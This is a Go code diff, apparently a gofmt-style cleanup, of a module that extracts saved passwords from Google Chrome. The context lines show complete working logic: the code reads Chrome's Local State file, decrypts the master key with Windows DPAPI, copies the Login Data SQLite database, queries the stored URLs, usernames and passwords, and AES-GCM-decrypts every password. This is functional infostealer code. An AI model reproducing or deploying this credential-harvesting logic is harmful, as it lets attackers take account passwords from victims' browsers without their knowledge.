@@ -15,29 +15,28 @@ import (
 )
 
 var (
-	CHROME_PATH_LOCAL_STATE = fmt.Sprintf("%s/Google/Chrome/User Data/Local State", LOCALAPPDATA);
-	CHROME_PATH_LOGIN_DATA = fmt.Sprintf("%s/Google/Chrome/User Data/Default/Login Data", LOCALAPPDATA);
+	CHROME_PATH_LOCAL_STATE = fmt.Sprintf("%s/Google/Chrome/User Data/Local State", LOCALAPPDATA)
+	CHROME_PATH_LOGIN_DATA  = fmt.Sprintf("%s/Google/Chrome/User Data/Default/Login Data", LOCALAPPDATA)
 )
 
-
-func Chrome() BrowserConfig{
+func Chrome() BrowserConfig {
 	credentials := BrowserConfig{
-		Browser: "chrome",
+		Browser:     "chrome",
 		Credentials: []Credential{},
-	};
-
-	secretKey, err := getSecretKey(CHROME_PATH_LOCAL_STATE);
-	if err != nil {
-		fmt.Println(err.Error());
-		return credentials;
 	}
-	err = getLoginData(CHROME_PATH_LOGIN_DATA, secretKey, &credentials);
+
+	secretKey, err := getSecretKey(CHROME_PATH_LOCAL_STATE)
 	if err != nil {
 		fmt.Println(err.Error())
-		return credentials;
+		return credentials
+	}
+	err = getLoginData(CHROME_PATH_LOGIN_DATA, secretKey, &credentials)
+	if err != nil {
+		fmt.Println(err.Error())
+		return credentials
 	}
 
-	return credentials;
+	return credentials
 }
 
 // ****************************************************
@@ -66,14 +65,14 @@ func getSecretKey(localStatePath string) ([]byte, error) {
 	if !ok {
 		return nil, fmt.Errorf("encrypted_key not found in Local State")
 	}
-	encryptedKeyBytes, err := base64.StdEncoding.DecodeString(encryptedKey);
+	encryptedKeyBytes, err := base64.StdEncoding.DecodeString(encryptedKey)
 	if err != nil {
-		return nil, err;
+		return nil, err
 	}
 
-	decryptedKeyBytes, err := decodeBrowserKey(encryptedKeyBytes[5:]);
+	decryptedKeyBytes, err := decodeBrowserKey(encryptedKeyBytes[5:])
 	if err != nil {
-		return nil, err;
+		return nil, err
 	}
 
 	// Ensure the key has a valid size (16, 24, or 32 bytes)
@@ -85,8 +84,8 @@ func getSecretKey(localStatePath string) ([]byte, error) {
 }
 
 func decodeBrowserKey(encryptedKey []byte) ([]byte, error) {
-	decryptedKey, err := dpapi.DecryptBytes(encryptedKey);
-	return decryptedKey, err;
+	decryptedKey, err := dpapi.DecryptBytes(encryptedKey)
+	return decryptedKey, err
 }
 
 // ****************************************************
@@ -105,13 +104,13 @@ func decryptPassword(ciphertext string, secretKey []byte) (string, error) {
 	initializationVector := ciphertextBytes[3:15]
 
 	// Extract the encrypted password from the ciphertext
-	encryptedPassword := ciphertextBytes[15: ]
+	encryptedPassword := ciphertextBytes[15:]
 
 	// Create a new AES cipher block with GCM mode
 	block, err := aes.NewCipher(secretKey)
-    if err != nil {
-        return "", fmt.Errorf("error creating AES cipher: %v", err)
-    }
+	if err != nil {
+		return "", fmt.Errorf("error creating AES cipher: %v", err)
+	}
 
 	// Create a GCM cipher with the given block and initialization vector
 	aesGCM, err := cipher.NewGCM(block)
@@ -134,71 +133,71 @@ func decryptPassword(ciphertext string, secretKey []byte) (string, error) {
 // ****************************************************
 func getLoginData(loginDataPath string, secretKey []byte, credentials *BrowserConfig) error {
 	// copy the Login Data sqlite3 file to a temp file
-	tempFile, err := os.CreateTemp("", "chrome_login_data_*.db");
+	tempFile, err := os.CreateTemp("", "chrome_login_data_*.db")
 	if err != nil {
-		fmt.Println(err.Error());
-		return err;
+		fmt.Println(err.Error())
+		return err
 	}
-	defer os.Remove(tempFile.Name());
-	fileBytes, err := os.ReadFile(loginDataPath);
+	defer os.Remove(tempFile.Name())
+	fileBytes, err := os.ReadFile(loginDataPath)
 	if err != nil {
-		fmt.Println(err.Error());
-		return err;
+		fmt.Println(err.Error())
+		return err
 	}
-	err = os.WriteFile(tempFile.Name(), fileBytes, 0644);
+	err = os.WriteFile(tempFile.Name(), fileBytes, 0644)
 	if err != nil {
-		fmt.Println(err.Error());
-		return err;
+		fmt.Println(err.Error())
+		return err
 	}
 
 	// Connect to sqlite3 database
-	db, err := sql.Open("sqlite3", tempFile.Name());
+	db, err := sql.Open("sqlite3", tempFile.Name())
 	if err != nil {
-		fmt.Println(err.Error());
-		return err;
+		fmt.Println(err.Error())
+		return err
 	}
-	defer db.Close();
+	defer db.Close()
 
 	// Ping the database
-	err = db.Ping();
+	err = db.Ping()
 	if err != nil {
-		fmt.Println(err.Error());
-		return err;
+		fmt.Println(err.Error())
+		return err
 	}
 
 	// Query the database
-	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins");
+	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
 	if err != nil {
-		fmt.Println(err.Error());
-		return err;
+		fmt.Println(err.Error())
+		return err
 	}
 
 	// Iterate over the rows
 	for rows.Next() {
-		var url string;
-		var username string;
-		var ciphertext string;
+		var url string
+		var username string
+		var ciphertext string
 
-		err = rows.Scan(&url, &username, &ciphertext);
+		err = rows.Scan(&url, &username, &ciphertext)
 		if err != nil {
-			fmt.Println(err.Error());
-			return err;
+			fmt.Println(err.Error())
+			return err
 		}
 
 		// Decrypt the password
-		password, err := decryptPassword(ciphertext, secretKey);
+		password, err := decryptPassword(ciphertext, secretKey)
 		if err != nil {
-			fmt.Println(err.Error());
-			return err;
+			fmt.Println(err.Error())
+			return err
 		}
 
 		// Add the credential to the list
 		credentials.Credentials = append(credentials.Credentials, Credential{
-			URL: url,
+			URL:      url,
 			Username: username,
 			Password: password,
-		});
+		})
 	}
 
-	return nil;
+	return nil
 }
